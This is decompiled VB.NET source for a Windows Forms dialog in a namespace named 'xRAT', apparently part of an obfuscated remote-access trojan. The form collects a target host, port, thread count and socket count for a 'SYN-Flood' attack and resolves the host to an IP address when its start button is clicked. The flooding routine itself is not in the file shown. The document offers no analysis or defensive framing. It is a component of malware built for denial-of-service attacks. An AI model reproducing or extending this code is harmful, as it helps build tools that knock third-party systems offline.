Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Namespace xRAT
    <DesignerGenerated> _
    Public Class SYN
        Inherits Form
        ' Methods
        Public Sub New()
            Class1.QaIGh5M7cuigS
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If Me.TextBox1.Text.Contains("http://www.") Then
                    Dim hostEntry As IPHostEntry = Dns.GetHostEntry(Me.TextBox1.Text.Replace("http://www.", String.Empty))
                    Me.TextBox1.Text = hostEntry.AddressList(0).ToString
                ElseIf Me.TextBox1.Text.Contains("www.") Then
                    Dim entry4 As IPHostEntry = Dns.GetHostEntry(Me.TextBox1.Text.Replace("www.", String.Empty))
                    Me.TextBox1.Text = entry4.AddressList(0).ToString
                ElseIf Me.TextBox1.Text.Contains("http://") Then
                    Dim entry2 As IPHostEntry = Dns.GetHostEntry(Me.TextBox1.Text.Replace("http://", String.Empty))
                    Me.TextBox1.Text = entry2.AddressList(0).ToString
                Else
                    Dim entry3 As IPHostEntry = Dns.GetHostEntry(Me.TextBox1.Text)
                    Me.TextBox1.Text = entry3.AddressList(0).ToString
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
            Me.DialogResult = DialogResult.OK
            Me.Close
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.icontainer_0 Is Nothing)) Then
                    Me.icontainer_0.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(SYN))
            Me.Button1 = New Button
            Me.GroupBox1 = New GroupBox
            Me.TextBox1 = New TextBox
            Me.Label1 = New Label
            Me.TextBox2 = New TextBox
            Me.Label2 = New Label
            Me.Label3 = New Label
            Me.TextBox3 = New TextBox
            Me.Label4 = New Label
            Me.TextBox4 = New TextBox
            Me.GroupBox1.SuspendLayout
            Me.SuspendLayout
            Dim point As New Point(13, &H6B)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            Dim size As New Size(&H139, &H21)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 0
            Me.Button1.Text = "Start SYN-Flood"
            Me.Button1.UseVisualStyleBackColor = True
            Me.GroupBox1.Controls.Add(Me.TextBox4)
            Me.GroupBox1.Controls.Add(Me.Label4)
            Me.GroupBox1.Controls.Add(Me.TextBox3)
            Me.GroupBox1.Controls.Add(Me.Label3)
            Me.GroupBox1.Controls.Add(Me.TextBox1)
            Me.GroupBox1.Controls.Add(Me.Label1)
            Me.GroupBox1.Controls.Add(Me.TextBox2)
            Me.GroupBox1.Controls.Add(Me.Label2)
            point = New Point(12, 12)
            Me.GroupBox1.Location = point
            Me.GroupBox1.Name = "GroupBox1"
            size = New Size(&H13A, &H5C)
            Me.GroupBox1.Size = size
            Me.GroupBox1.TabIndex = 12
            Me.GroupBox1.TabStop = False
            Me.GroupBox1.Text = "SYN-Flood Settings"
            point = New Point(&H30, &H19)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            size = New Size(&HFB, &H15)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 0
            Me.TextBox1.Text = "127.0.0.1"
            Me.Label1.AutoSize = True
            point = New Point(9, &H1C)
            Me.Label1.Location = point
            Me.Label1.Name = "Label1"
            size = New Size(&H21, 13)
            Me.Label1.Size = size
            Me.Label1.TabIndex = 1
            Me.Label1.Text = "Host:"
            point = New Point(&H30, &H33)
            Me.TextBox2.Location = point
            Me.TextBox2.Name = "TextBox2"
            size = New Size(&H36, &H15)
            Me.TextBox2.Size = size
            Me.TextBox2.TabIndex = 2
            Me.TextBox2.Text = "80"
            Me.Label2.AutoSize = True
            point = New Point(9, &H36)
            Me.Label2.Location = point
            Me.Label2.Name = "Label2"
            size = New Size(&H1F, 13)
            Me.Label2.Size = size
            Me.Label2.TabIndex = 6
            Me.Label2.Text = "Port:"
            Me.Label3.AutoSize = True
            point = New Point(&H6D, &H36)
            Me.Label3.Location = point
            Me.Label3.Name = "Label3"
            size = New Size(50, 13)
            Me.Label3.Size = size
            Me.Label3.TabIndex = 7
            Me.Label3.Text = "Threads:"
            point = New Point(&H9E, &H33)
            Me.TextBox3.Location = point
            Me.TextBox3.Name = "TextBox3"
            size = New Size(&H35, &H15)
            Me.TextBox3.Size = size
            Me.TextBox3.TabIndex = 8
            Me.TextBox3.Text = "20"
            Me.Label4.AutoSize = True
            point = New Point(&HDB, &H36)
            Me.Label4.Location = point
            Me.Label4.Name = "Label4"
            size = New Size(&H2B, 13)
            Me.Label4.Size = size
            Me.Label4.TabIndex = 9
            Me.Label4.Text = "Socket:"
            point = New Point(&H105, &H33)
            Me.TextBox4.Location = point
            Me.TextBox4.Name = "TextBox4"
            size = New Size(&H26, &H15)
            Me.TextBox4.Size = size
            Me.TextBox4.TabIndex = 10
            Me.TextBox4.Text = "10"
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H151, &H9E)
            Me.ClientSize = size
            Me.Controls.Add(Me.GroupBox1)
            Me.Controls.Add(Me.Button1)
            Me.FormBorderStyle = FormBorderStyle.Fixed3D
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "SYN"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "SYN-Flood"
            Me.GroupBox1.ResumeLayout(False)
            Me.GroupBox1.PerformLayout
            Me.ResumeLayout(False)
        End Sub

        Private Sub TextBox2_KeyPress(ByVal sender As Object, ByVal e As KeyPressEventArgs)
            Dim num As Integer = Strings.Asc(e.KeyChar)
            If (((num < &H30) OrElse (num > &H39)) AndAlso (num <> 8)) Then
                e.Handled = True
            End If
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = value
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property GroupBox1 As GroupBox
            Get
                Return Me._GroupBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox1 = value
            End Set
        End Property

        Public ReadOnly Property HOST As Object
            Get
                Return Me.TextBox1.Text
            End Get
        End Property

        Friend Overridable Property Label1 As Label
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label1 = value
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label2 = value
            End Set
        End Property

        Friend Overridable Property Label3 As Label
            Get
                Return Me.daxawBwCf
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me.daxawBwCf = value
            End Set
        End Property

        Friend Overridable Property Label4 As Label
            Get
                Return Me._Label4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label4 = value
            End Set
        End Property

        Public ReadOnly Property PORT As Object
            Get
                Return Me.TextBox2.Text
            End Get
        End Property

        Friend Overridable Property TextBox1 As TextBox
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox1 = value
            End Set
        End Property

        Friend Overridable Property TextBox2 As TextBox
            Get
                Return Me._TextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Dim handler As KeyPressEventHandler = New KeyPressEventHandler(AddressOf Me.TextBox2_KeyPress)
                If (Not Me._TextBox2 Is Nothing) Then
                    RemoveHandler Me._TextBox2.KeyPress, handler
                End If
                Me._TextBox2 = value
                If (Not Me._TextBox2 Is Nothing) Then
                    AddHandler Me._TextBox2.KeyPress, handler
                End If
            End Set
        End Property

        Friend Overridable Property TextBox3 As TextBox
            Get
                Return Me._TextBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox3 = value
            End Set
        End Property

        Friend Overridable Property TextBox4 As TextBox
            Get
                Return Me._TextBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox4 = value
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("GroupBox1")> _
        Private _GroupBox1 As GroupBox
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("Label4")> _
        Private _Label4 As Label
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("TextBox2")> _
        Private _TextBox2 As TextBox
        <AccessedThroughProperty("TextBox3")> _
        Private _TextBox3 As TextBox
        <AccessedThroughProperty("TextBox4")> _
        Private _TextBox4 As TextBox
        <AccessedThroughProperty("Label3")> _
        Private daxawBwCf As Label
        Private icontainer_0 As IContainer
    End Class
End Namespace

